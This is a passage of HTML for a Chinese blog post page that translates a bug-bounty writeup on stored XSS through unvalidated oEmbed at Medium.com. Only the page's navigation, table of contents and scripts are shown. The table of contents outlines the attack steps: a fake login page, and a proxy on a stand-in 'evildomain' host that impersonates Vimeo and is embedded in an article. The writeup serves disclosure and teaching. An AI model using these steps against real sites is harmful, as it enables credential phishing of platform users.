+            <span>原始链接:</span><a class="post-url" href="/2019/02/26/第二十一篇：存储型XSS（前续）/" title="第二十一篇：存储型XSS（前续）">http://TimeS0ng.github.io/2019/02/26/第二十一篇：存储型XSS（前续）/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2019/02/26/第二十一篇：存储型XSS（前续）/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/02/24/第二十篇：持久性XSS/">
+                    第二十篇：持久性XSS变异
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：Persistent-XSS-Unvalidated-oEmbed-at-Medium-com"><span class="toc-number">1.</span> <span class="toc-text">原文：Persistent XSS (Unvalidated oEmbed) at Medium.com</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞："><span class="toc-number">2.</span> <span class="toc-text">漏洞：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Jonathan-Bouman"><span class="toc-number">3.</span> <span class="toc-text">作者：Jonathan Bouman</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：高"><span class="toc-number">4.</span> <span class="toc-text">难度：高</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#背景"><span class="toc-number"></span> <span class="toc-text">背景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-在我们之前的一篇报告中，我们学会了关于反射型XSS的知识；reflect-XSS的缺点是我们需要欺骗用户访问攻击者构造好的URL。"><span class="toc-number">1.</span> <span class="toc-text">  在我们之前的一篇报告中，我们学会了关于反射型XSS的知识；reflect XSS的缺点是我们需要欺骗用户访问攻击者构造好的URL。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-但是，如果我们可以将我们的javascript代码存储在页面中呢？"><span class="toc-number">2.</span> <span class="toc-text">  但是，如果我们可以将我们的javascript代码存储在页面中呢？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。"><span class="toc-number">3.</span> <span class="toc-text">  那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium-com怎么样？他们的奖金超级丰厚"><span class="toc-number">4.</span> <span class="toc-text">  一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium.com怎么样？他们的奖金超级丰厚</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#确定目标"><span class="toc-number"></span> <span class="toc-text">确定目标</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。"><span class="toc-number">1.</span> <span class="toc-text">  存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）"><span class="toc-number">2.</span> <span class="toc-text">  编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的-按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed"><span class="toc-number">3.</span> <span class="toc-text">  通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的(+)按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-如果你拥有一个像Medium-com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。"><span class="toc-number">4.</span> <span class="toc-text">  如果你拥有一个像Medium.com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-为了验证我们的概念，我们做一个fake-login"><span class="toc-number">5.</span> <span class="toc-text">  为了验证我们的概念，我们做一个fake login</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#寻找漏洞，Embed-ly如何运作的？"><span class="toc-number">6.</span> <span class="toc-text">寻找漏洞，Embed.ly如何运作的？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-首先，他们声明他们支持oEmbed规范；"><span class="toc-number">7.</span> <span class="toc-text">  首先，他们声明他们支持oEmbed规范；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake-login页面。"><span class="toc-number">8.</span> <span class="toc-text">  那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake login页面。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-很遗憾，只有经过批准的提供者才能嵌入他们的代码。"><span class="toc-number">9.</span> <span class="toc-text">  很遗憾，只有经过批准的提供者才能嵌入他们的代码。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed-ly的内部工作原理。"><span class="toc-number">10.</span> <span class="toc-text">  让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed.ly的内部工作原理。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-值得注意的是，Embed-ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed-ly立即就能从缓存中提取，不必再去请求一遍。"><span class="toc-number">11.</span> <span class="toc-text">  值得注意的是，Embed.ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed.ly立即就能从缓存中提取，不必再去请求一遍。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-因此我们需要欺骗Embed-ly为我们的fake-login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake-login，这样当Medium请求mediaResourceId的时候就会加载我们的fake-login"><span class="toc-number">12.</span> <span class="toc-text">  因此我们需要欺骗Embed.ly为我们的fake login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake login，这样当Medium请求mediaResourceId的时候就会加载我们的fake login</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-没有公共，我尝试了多种办法均没有达到效果！"><span class="toc-number">13.</span> <span class="toc-text">  没有公共，我尝试了多种办法均没有达到效果！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-所以我们必须考虑其它办法了。"><span class="toc-number">14.</span> <span class="toc-text">  所以我们必须考虑其它办法了。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-下面的代码是-截图6-的请求内容"><span class="toc-number">15.</span> <span class="toc-text">  下面的代码是[截图6]的请求内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Decoded"><span class="toc-number">16.</span> <span class="toc-text">Decoded:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-如果我们可以做某种中间人攻击-MITM-并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake-login页面。搜索指向Vimeo播放器的字符串https-player-vimeo-com-video-142424242-并将其更改为https-evildomain-ltd-fakelogin"><span class="toc-number">17.</span> <span class="toc-text">  如果我们可以做某种中间人攻击[MITM]并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake login页面。搜索指向Vimeo播放器的字符串https://player.vimeo.com/video/142424242 并将其更改为https://evildomain.ltd/fakelogin</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MITM-Attack"><span class="toc-number"></span> <span class="toc-text">MITM Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-快速设置：打开你的PHP服务器，上传fakelogin-html（包含正确设计的fake-login），上传proxy-php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）"><span class="toc-number">1.</span> <span class="toc-text">1. 快速设置：打开你的PHP服务器，上传fakelogin.html（包含正确设计的fake login），上传proxy.php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-在proxy-php-第381行上面添加一行"><span class="toc-number">2.</span> <span class="toc-text">2. 在proxy.php 第381行上面添加一行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-创建一个新的Medium文章"><span class="toc-number">3.</span> <span class="toc-text">3. 创建一个新的Medium文章</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-嵌入网址https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242"><span class="toc-number">4.</span> <span class="toc-text">4. 嵌入网址https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Medium-com他们的服务器将从https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake-login页面而不是视频播放器"><span class="toc-number">5.</span> <span class="toc-text">5. Medium.com他们的服务器将从https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake login页面而不是视频播放器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-等待"><span class="toc-number">6.</span> <span class="toc-text">6. 等待</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"第二十一篇：存储型XSS（前续）　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+    <script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2142877';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+    <div id="uyan_frame"></div>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/02/24/第二十篇：持久性XSS/" title="下一篇: 第二十篇：持久性XSS变异">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/02/26/第二十一篇：存储型XSS（前续）/">第二十一篇：存储型XSS（前续）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/24/第二十篇：持久性XSS/">第二十篇：持久性XSS变异</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/18/第十九篇：绕过邮件验证/">第十九篇：绕过邮件验证</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/16/第十八篇：CSRF导致账号接管/">第十八篇：CSRF导致账号接管</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/15/第十七篇：盗取登陆令牌/">第十七篇：盗取登陆令牌</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/15/第十六篇：盲注XSS/">第十六篇：盲注XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/14/第十五篇：SQL注入读取、写入文件/">第十五篇：SQL注入读取、写入文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/14/第十四篇：SSRF读取本地文件/">第十四篇：SSRF读取本地文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/14/第十三篇：命令执行/">第十三篇：命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/27/第十二篇翻译：反射型XSS/">第十二篇翻译：反射型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/27/第十一篇翻译：CSRF漏洞/">第十一篇翻译：CSRF漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/23/第十篇翻译：CORS跨域请求/">第十篇翻译：CORS跨域请求</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/23/第九篇翻译：CORS跨域请求/">第九篇翻译：CORS跨域请求</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/23/第八篇翻译：绕过XSS防护/">第八篇翻译：绕过XSS防护</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/23/第七篇翻译：bypass-CSRF/">第七篇翻译：bypass CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/23/第六篇翻译：信息泄露/">第六篇翻译：信息泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/23/第五篇翻译：SSRF-to-XSS/">第五篇翻译：SSRF to XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/21/第四篇翻译：XSS漏洞/">第四篇翻译：XSS漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/20/第三篇翻译：XXE漏洞/">第三篇翻译：XXE漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/">第二篇翻译：URL重定向</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/第一篇翻译：Change-Anyone’s-profile-picture-Exploiting-IDOR/">第一篇翻译：越权漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/27/CVE-2018-8174-漏洞复现/">CVE-2018-8174 漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/04/SQL注入导图/">SQL注入导图</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/04/漫谈攻击链-从webshell到域控的奇妙之旅/">漫谈攻击链--从webshell到域控的奇妙之旅</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/">win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/Windows密码抓取总结/">Windows密码抓取总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Windows-提权基础（下）/">Windows 提权基础（下）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Windows-提权基础（上）/">Windows 提权基础（上）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/30/kali-代理之shadowsocks-proxychains/">kali 代理之shadowsocks & proxychains</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/28/bash-伪多进程/">bash 伪多进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/Firewalk-原理/">Firewalk 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/08/kali使用入坑指南（二）/">kali使用入坑指南（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/利用iodine绕过防火墙/">利用iodine绕过防火墙</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/kali使用入坑指南（一）/">kali使用入坑指南(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/kali安装KVM入坑笔记/">kali安装KVM入坑笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/JBOSS反序列化漏洞复现/">JOBSS反序列化漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/花式钓鱼法/">花式钓鱼法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/23/RINETD的妙用/">RINET 的妙用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/27/HTTPS攻击/">HTTPS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/The-Backdoor-Factory/">The-Backdoor-Factory</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/08/Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/MITMF/">MITMF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/无线渗透-序章-中间人攻击/">无线渗透(序章)--中间人攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/Slowhttptest/">Slowhttptest</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/TearDrop/">TearDrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/SOCKSTRESS/">SOCKSTRESS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/21/Syn-Flood/">Syn-Flood</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/03/无线渗透(下)—企业级WPA破解/">无线渗透(下)—企业级WPA破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(中)--WPS破解/">无线渗透(中)--WPS破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(上)--WPA加密/">无线渗透(上)--WPA加密</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/信息收集— 僵尸扫描/">信息收集— 僵尸扫描</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2019 TimeS0ng
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
